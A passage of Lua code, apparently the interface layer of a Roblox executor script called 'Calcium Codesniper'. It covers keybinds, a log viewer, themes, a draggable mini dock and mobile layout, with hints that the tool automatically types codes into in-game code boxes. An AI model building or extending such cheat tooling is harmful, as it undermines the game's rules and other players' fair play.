        bind.Activated:Connect(function()
            if listeningConn then listeningConn:Disconnect();listeningConn=nil end
            listeningFor=key;bind.Text="PRESS KEY"
            listeningConn=UserInputService.InputBegan:Connect(function(input)
                if input.UserInputType~=Enum.UserInputType.Keyboard then return end
                if input.KeyCode==Enum.KeyCode.Escape then
                    savedConfig[key]=nil
                elseif input.KeyCode~=Enum.KeyCode.Unknown then
                    savedConfig[key]=input.KeyCode.Name
                else
                    return
                end
                saveConfig()
                listeningFor=nil
                bind.Text=tostring(savedConfig[key] or "NONE")
                listeningConn:Disconnect();listeningConn=nil
            end)
        end)
    end

    -- LOGS: same backend console feed, on-demand updates only.
    local logs=pages.Logs
    pageSpotlight(logs,"MONITOR  /  04","Activity Stream","04")
    section(logs,"Recent activity")
    local logPanel=card(logs,298)
    local logScroll=mk("ScrollingFrame",logPanel,{Position=UDim2.fromOffset(13,12),
        Size=UDim2.new(1,-26,1,-23),BackgroundTransparency=1,BorderSizePixel=0,
        ScrollBarThickness=3,ScrollBarImageColor3=P.accent,
        CanvasSize=UDim2.new(),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=35})
    local logText=text(logScroll,"Awaiting activity...",12,P.white,Enum.Font.GothamMedium,
        {TextWrapped=true,RichText=true,TextTruncate=Enum.TextTruncate.None,
        TextYAlignment=Enum.TextYAlignment.Top,LineHeight=1.35,
        AutomaticSize=Enum.AutomaticSize.Y,Size=UDim2.new(1,-8,0,0),ZIndex=36})
    local clearLog=button(logs,"CLEAR LOGS",function()
        if type(clearLogs)=="function" then pcall(clearLogs) end
        logText.Text="Activity cleared"
    end)
    clearLog.Size=UDim2.new(1,-4,0,39)

    local function skinOG()
        local ok,env=pcall(function() return (getgenv and getgenv()) or _G end)
        local ogGui=ok and env and env.CalciumOGSniperGui
        if not ogGui or not ogGui.Parent then return end
        local ogRoot=ogGui:FindFirstChild("MainFrame")
        if not ogRoot then return end
        local bg=ogRoot:FindFirstChild("BgImage")
        if bg and bg:IsA("ImageLabel") then
            bg.Image=wallpaper.Image
            bg.ImageColor3=wallpaper.ImageColor3
            bg.ImageTransparency=.47
        end
        local dim=ogRoot:FindFirstChild("BgDim")
        if dim then dim.BackgroundColor3=P.bg;dim.BackgroundTransparency=.14 end
        ogRoot.BackgroundColor3=P.bg
        local border=ogRoot:FindFirstChildOfClass("UIStroke")
        if border then border.Color=P.accent;border.Transparency=.35 end
    end
    local launchOG=button(home,"OPEN OG SNIPER",function()
        if type(loadOGSniper)=="function" then pcall(loadOGSniper) end
        task.defer(skinOG)
    end)
    launchOG.Size=UDim2.new(1,-4,0,39)

    -- Dock objects are initialized further down. Forward declarations prevent
    -- these callbacks from capturing nil globals before the dock exists.
    local dock, dockEdge, dockBg, dockLogo
    applyWallpaper=function()
        local id=tostring(skin.wallpaper or "")
        local img=""
        if id=="NONE" or id=="" then
            img=""
        elseif id=="CUSTOM" then
            local raw=tostring(skin.custom or ""):match("^%d+$" ) and skin.custom or ""
            img=raw~="" and "rbxassetid://"..raw or DEFAULT_IMG
        elseif id:match("^%d+$") then
            img="rbxassetid://"..id
        else
            -- Backward-compatible V10 saved NEBULA/FROST/SOLAR wallpapers.
            img=DEFAULT_IMG
        end
        local visibility=math.clamp(tonumber(skin.wallpaperOpacity) or .60,.12,.90)
        wallpaper.Image=img
        wallpaper.ImageTransparency=img=="" and 1 or visibility
        heroArt.Image=img
        heroArt.ImageTransparency=img=="" and 1 or math.max(.40,visibility)
        railPicture.Image=img
        if dockBg then dockBg.Image=img end
        wallpaper.ImageColor3=Color3.fromRGB(190,223,241)
        heroArt.ImageColor3=Color3.fromRGB(190,223,241)
        if dockBg then dockBg.ImageColor3=Color3.fromRGB(190,223,241) end
        opacityValue.Text=tostring(math.floor((1-visibility)*100+.5)).."% VISIBLE"
        for key,entry in pairs(imageButtons) do
            local active=(id==key)
            entry.border.Color=active and P.accent or P.stroke
            entry.border.Thickness=active and 2.6 or 1.1
            entry.border.Transparency=active and .05 or .62
        end
        gallery.ScrollBarImageColor3=P.accent
        skinOG()
    end
    local function applyColors()
        P.accent=ACCENTS[skin.accent] or ACCENTS.CYAN
        outerLine.Color=P.accent;topRule.BackgroundColor3=P.accent
        dockEdge.Color=P.accent;dockLogo.BackgroundColor3=P.accent
        avatarEdge.Color=P.accent
        brandSub.TextColor3=P.accent;upper.TextColor3=P.accent
        brandLogoHolder.BackgroundColor3=P.accent
        railBorder.BackgroundColor3=P.accent -- railLight was never created; removed invalid reference
        centerPoint.BackgroundColor3=P.accent
        heroLight.BackgroundColor3=P.accent;targetEdge.Color=P.accent
        heroTint.BackgroundColor3=P.panel
        telemetry.TextColor3=P.accent;linkValue.TextColor3=P.accent
        logScroll.ScrollBarImageColor3=P.accent
        countText.TextColor3=P.accent;intelStatus.TextColor3=P.accent
        announceFill.BackgroundColor3=P.accent
        answer.TextColor3=P.accent
        for _,obj in ipairs(starList) do obj.BackgroundColor3=P.accent end
        for _,o in ipairs(spotlights) do
            o.strip.BackgroundColor3=P.accent;o.label.TextColor3=P.accent
            local ring=o.stamp:FindFirstChildOfClass("UIStroke")
            if ring then ring.Color=P.accent end
        end
        for _,entry in pairs(imageButtons) do
            if entry.border then entry.border.Color=P.stroke end
        end
        for _,bar in pairs(navBars) do bar.BackgroundColor3=P.accent end
        for _,spec in ipairs(themed) do
            if spec.obj.Parent then
                spec.obj.BackgroundColor3=P.accent
                spec.obj.TextColor3=P.bg
            end
        end
        for name,b in pairs(accentButtons) do
            local isSelected=skin.accent==name
            b.BackgroundColor3=isSelected and P.accent or P.raised
            b.TextColor3=isSelected and P.bg or P.white
        end
        for _,pg in pairs(pages) do pg.ScrollBarImageColor3=P.accent end
        logScroll.ScrollBarImageColor3=P.accent
        navigate(current)
        applyWallpaper()
        skinOG()
    end
    for name,b in pairs(accentButtons) do
        b.Activated:Connect(function()
            skin.accent=name;persist();applyColors()
        end)
    end
    -- The earlier button hook only changes the selected theme; this second
    -- handler repaints all visual components immediately.

    -- Independent mini dock: readable on phones, drag anywhere on the left,
    -- click expand on the right. No compressed or overlapping main controls.
    dock=curve(mk("Frame",GUI,{Name="CalciumMiniDock",Visible=false,
        AnchorPoint=Vector2.new(1,1),Position=UDim2.new(1,-21,1,-24),
        Size=UDim2.fromOffset(274,57),BackgroundColor3=P.panel,
        BorderSizePixel=0,Active=true,ClipsDescendants=true,ZIndex=80}),28)
    dockEdge=edge(dock,P.accent,.18,1.45)
    local dockGlow=mk("UIGradient",dockEdge,{Rotation=0,
        Color=ColorSequence.new({ColorSequenceKeypoint.new(0,P.accent),
            ColorSequenceKeypoint.new(.5,Color3.fromRGB(97,154,244)),
            ColorSequenceKeypoint.new(1,P.accent)})})
    dockBg=curve(mk("ImageLabel",dock,{Size=UDim2.fromScale(1,1),Image=DEFAULT_IMG,
        ImageColor3=Color3.fromRGB(140,215,240),ImageTransparency=.78,
        ScaleType=Enum.ScaleType.Crop,BackgroundTransparency=1,ZIndex=81}),28)
    local dockShade=curve(mk("Frame",dock,{Size=UDim2.fromScale(1,1),BackgroundColor3=P.bg,
        BackgroundTransparency=.32,BorderSizePixel=0,ZIndex=82}),28)
    local dockHandle=mk("Frame",dock,{Name="MoveDock",Size=UDim2.new(1,-54,1,0),
        BackgroundTransparency=1,Active=true,ZIndex=83})
    dockLogo=curve(mk("Frame",dockHandle,{Size=UDim2.fromOffset(40,40),
        Position=UDim2.fromOffset(9,8),BackgroundColor3=P.accent,
        BorderSizePixel=0,ZIndex=84}),21)
    edge(dockLogo,P.white,.60,1.2)
    local dockLogoImg=curve(mk("ImageLabel",dockLogo,{Name="CalciumLogo",
        Image="",Position=UDim2.fromOffset(3,3),Size=UDim2.new(1,-6,1,-6),
        BackgroundTransparency=1,ScaleType=Enum.ScaleType.Fit,ZIndex=85}),16)
    local dockLogoFallback=text(dockLogo,"C",18,P.bg,Enum.Font.GothamBlack,
        {Size=UDim2.fromScale(1,1),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=86})
    local dockAvatarHolder=curve(mk("Frame",dockHandle,{Name="HeadshotRing",
        Position=UDim2.fromOffset(38,34),Size=UDim2.fromOffset(21,21),
        BackgroundColor3=P.white,BorderSizePixel=0,ZIndex=87}),11)
    curve(mk("ImageLabel",dockAvatarHolder,{Image=avatarUri,
        Position=UDim2.fromOffset(2,2),Size=UDim2.new(1,-4,1,-4),
        BackgroundTransparency=1,ScaleType=Enum.ScaleType.Crop,ZIndex=88}),8)
    local dockTitle=titleFont(text(dockHandle,"CALCIUM",14,P.white,Enum.Font.GothamBlack,
        {Position=UDim2.fromOffset(69,7),Size=UDim2.fromOffset(126,22),ZIndex=85}))
    local dockSub=text(dockHandle,"CODESNIPER   •   LIVE",9,P.good,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(69,30),Size=UDim2.fromOffset(139,16),ZIndex=85})
    -- Apply actual logo when available; otherwise display a crisp built-in C.
    applyCalciumLogo=function()
        local id=tostring(skin.logo or "0")
        local valid=id:match("^%d+$") and tonumber(id) and tonumber(id)>0
        local imageId=valid and ("rbxassetid://"..id) or ""
        dockLogoImg.Image=imageId
        brandLogoImage.Image=imageId
        dockLogoFallback.Visible=not valid
        brandLogoFallback.Visible=not valid
    end
    applyCalciumLogo()
    local expand=button(dock,"OPEN",nil,true)
    expand.Name="Expand"
    expand.TextSize=11
    curve(expand,21)
    expand.Size=UDim2.fromOffset(40,40)
    expand.Position=UDim2.new(1,-47,.5,-20)
    expand.ZIndex=86
    local minimized=false
    local mobile=false
    local widthNow=724
    local heightNow=520
    local icons={}
    -- Symbols are hidden in the phone tab bar for easy-to-read text labels.
    for _,item in ipairs(MENU) do
        for _,obj in ipairs(navButtons[item[1]]:GetChildren()) do
            if obj:IsA("TextLabel") and obj~=navLabels[item[1]] then
                icons[item[1]]=obj
            end
        end
    end
    local function responsive()
        if not root.Parent then return end
        local camera=workspace.CurrentCamera
        local view=camera and camera.ViewportSize or Vector2.new(1280,720)
        mobile=view.X<645 or (UserInputService.TouchEnabled and view.X<820)
        widthNow=math.max(270,math.min(mobile and 390 or 724,view.X-16))
        heightNow=math.max(285,math.min(520,view.Y-24))
        if not minimized then root.Size=UDim2.fromOffset(widthNow,heightNow) end
        if mobile then
            rail.Visible=false
            navWrap.Parent=root
            navWrap.Position=UDim2.fromOffset(12,76)
            navWrap.Size=UDim2.new(1,-24,0,44)
            navWrap.CanvasSize=UDim2.fromOffset(5*79,0)
            navWrap.ScrollingDirection=Enum.ScrollingDirection.X
            header.Position=UDim2.fromOffset(0,0)
            header.Size=UDim2.new(1,0,0,74)
            workspaceShell.Position=UDim2.fromOffset(7,122)
            workspaceShell.Size=UDim2.new(1,-14,1,-129)
            pagesWrap.Position=UDim2.fromOffset(16,130)
            pagesWrap.Size=UDim2.new(1,-32,1,-140)
            pageTitle.TextSize=20
            upper.TextSize=9
            statusPill.Visible=widthNow>360
            for i,item in ipairs(MENU) do
                local name=item[1]
                local b=navButtons[name]
                b.Position=UDim2.fromOffset((i-1)*79,2)
                b.Size=UDim2.fromOffset(75,38)
                navLabels[name].Position=UDim2.fromOffset(0,0)
                navLabels[name].Size=UDim2.fromScale(1,1)
                navLabels[name].TextXAlignment=Enum.TextXAlignment.Center
                navLabels[name].TextSize=11
                if icons[name] then icons[name].Visible=false end
                navBars[name].Size=UDim2.new(1,-29,0,2)
                navBars[name].Position=UDim2.new(0,15,1,-3)
            end
            crosshair.Visible=widthNow>335
        else
            rail.Visible=true
            rail.Size=UDim2.fromOffset(170,heightNow)
            navWrap.Parent=rail
            navWrap.Position=UDim2.fromOffset(7,95)
            navWrap.Size=UDim2.new(1,-14,1,-142)
            navWrap.CanvasSize=UDim2.fromOffset(0,290)
            navWrap.CanvasPosition=Vector2.zero
            navWrap.ScrollingDirection=Enum.ScrollingDirection.Y
            header.Position=UDim2.fromOffset(170,0)
            header.Size=UDim2.new(1,-170,0,73)
            workspaceShell.Position=UDim2.fromOffset(177,70)
            workspaceShell.Size=UDim2.new(1,-185,1,-77)
            pagesWrap.Position=UDim2.fromOffset(189,85)
            pagesWrap.Size=UDim2.new(1,-201,1,-101)
            pageTitle.TextSize=23
            upper.TextSize=9
            statusPill.Visible=true
            for i,item in ipairs(MENU) do
                local name=item[1]
                local b=navButtons[name]
                b.Position=UDim2.fromOffset(3,(i-1)*54)
                b.Size=UDim2.new(1,-6,0,47)
                navLabels[name].Position=UDim2.fromOffset(47,0)
                navLabels[name].Size=UDim2.new(1,-53,1,0)
                navLabels[name].TextXAlignment=Enum.TextXAlignment.Left
                navLabels[name].TextSize=12
                if icons[name] then icons[name].Visible=true end
                navBars[name].Position=UDim2.fromOffset(0,11)
                navBars[name].Size=UDim2.fromOffset(3,26)
            end
            crosshair.Visible=true
        end
        -- Compact dock also fits narrow phone viewports.
        dock.Size=UDim2.fromOffset(math.min(274,view.X-20),57)
    end
    local camConn
    local function watchCamera()
        if camConn then camConn:Disconnect() end
        if workspace.CurrentCamera then
            camConn=workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(responsive)
        end
        responsive()
    end
    local cameraConn=workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(watchCamera)

    -- Separate drag handlers support touch and mouse.
    local dragConnections={}
    local function draggable(handle,object)
        local activeInput,mouseDown,startPos,startFrame
        local began=handle.InputBegan:Connect(function(input)
            if input.UserInputType~=Enum.UserInputType.MouseButton1 and
                input.UserInputType~=Enum.UserInputType.Touch then return end
            activeInput=input
            mouseDown=true
            startPos=input.Position
            startFrame=object.Position
            input.Changed:Connect(function()
                if input.UserInputState==Enum.UserInputState.End then
                    mouseDown=false;activeInput=nil
                end
            end)
        end)
        local changed=UserInputService.InputChanged:Connect(function(input)
            if not mouseDown or not activeInput then return end
            if input~=activeInput and
                not (activeInput.UserInputType==Enum.UserInputType.MouseButton1 and
                    input.UserInputType==Enum.UserInputType.MouseMovement) then return end
            local delta=input.Position-startPos
            object.Position=UDim2.new(startFrame.X.Scale,startFrame.X.Offset+delta.X,
                startFrame.Y.Scale,startFrame.Y.Offset+delta.Y)
        end)
        dragConnections[#dragConnections+1]=began
        dragConnections[#dragConnections+1]=changed
    end
    draggable(header,root)
    draggable(dockHandle,dock)

    local function setMinimized(on)
        if minimized==on then return end
        minimized=on
        if on then
            dock.Visible=true
            dock.Size=UDim2.fromOffset(230,51)
            tw(dock,{Size=UDim2.fromOffset(math.min(274,(workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize.X or 420)-20),57)},.22)
            root.Visible=false
        else
            dock.Visible=false
            root.Visible=true
            root.Size=UDim2.fromOffset(widthNow-16,heightNow-12)
            tw(root,{Size=UDim2.fromOffset(widthNow,heightNow)},.24)
            responsive()
            navigate(current)
        end
    end
    minimize.Activated:Connect(function()setMinimized(true)end)
    expand.Activated:Connect(function()setMinimized(false)end)

    local lastConsole=""
    local lastSpeed=""
    local lastLink=""
    local uiAlive=true
    task.spawn(function()
        while uiAlive and _instanceRunning and root.Parent do
            task.wait(.65)
            if not uiAlive or not root.Parent then break end
            updateAll()
            dockSub.Text=autoWriteEnabled and "CODESNIPER   •   LIVE" or "CODESNIPER   •   PAUSED"
            dockSub.TextColor3=autoWriteEnabled and P.good or P.bad
            -- Passive status only: codebox linking remains fully automatic.
            local linked=_primaryTarget and _primaryTarget.alive() and _primaryTarget.btn~=nil
            local status=linked and "CONNECTED" or "SEARCHING"
            if status~=lastLink then
                lastLink=status
                linkValue.Text=status
                linkValue.TextColor3=linked and P.good or P.accent
            end
            if SpeedLabel and SpeedLabel.Parent then
                local val=SpeedLabel.Text
                if val~=lastSpeed then
                    lastSpeed=val
                    local ms=val:match("([%d%.]+)%s*ms")
                    if ms then telemetry.Text=ms.." ms" end
                end
            end
            if current=="Logs" and ConsoleOutput and ConsoleOutput.Parent then
                local content=ConsoleOutput.Text
                if content~=lastConsole then
                    lastConsole=content
                    logText.Text=content
                    task.defer(function()
                        if logScroll.Parent then
                            logScroll.CanvasPosition=Vector2.new(0,math.max(0,
                                logScroll.AbsoluteCanvasSize.Y-logScroll.AbsoluteWindowSize.Y))
                        end
                    end)
                end
            end
        end
    end)

    local ogTaskActive=true
    task.spawn(function()
        while ogTaskActive and _instanceRunning and root.Parent do
            task.wait(2)
            if ogTaskActive then
                local env=(getgenv and getgenv()) or _G
                local og=env.CalciumOGSniperGui
                if og and og.Parent and not og:GetAttribute("AuroraStyled") then
                    og:SetAttribute("AuroraStyled",true)
                    skinOG()
                end
            end
        end
    end)

    local priorStop=(getgenv and getgenv().StopAura)
    if getgenv and type(priorStop)=="function" then
        getgenv().StopAura=function(...)
            pcall(function() root:Destroy() end)
            pcall(function() dock:Destroy() end)
            return priorStop(...)
        end
    end
    root.Destroying:Connect(function()
        uiAlive=false
        ogTaskActive=false
        if camConn then camConn:Disconnect() end
        if cameraConn then cameraConn:Disconnect() end
        if listeningConn then listeningConn:Disconnect() end
        for _,conn in ipairs(dragConnections) do conn:Disconnect() end
        if LiveRiddleIntel.onUpdated==updateIntel then LiveRiddleIntel.onUpdated=nil end
        if dock.Parent then dock:Destroy() end
    end)
    -- The dock is fully constructed before theme callbacks run.
    -- Use explicit initialization checks so missing artwork can't break startup.
    -- Always load the Confuser's local Starborn font; never expect a Roblox ID.
    task.spawn(function()
        local ok,err=pcall(loadConfuserStarborn)
        if not ok then
            setFontStatus("STARBORN LOAD FAILED  /  SYSTEM FONT",P.bad)
            warn("[Calcium Codesniper] Starborn: "..tostring(err))
        end
    end)
    if wallpaper and heroArt and railPicture and dockBg then
        applyWallpaper()
    end
    if dockEdge and dockLogo and centerPoint then
        applyColors()
    end
    watchCamera()
    navigate("Home")
    -- GUI.Enabled was held false from initial creation, so the original GUI
    -- never flashes. Only Aurora and its optional mini dock can render.
    GUI.Enabled=true
    task.defer(function()
        if _instanceRunning then refreshFastTargets(true) end
    end)
end)
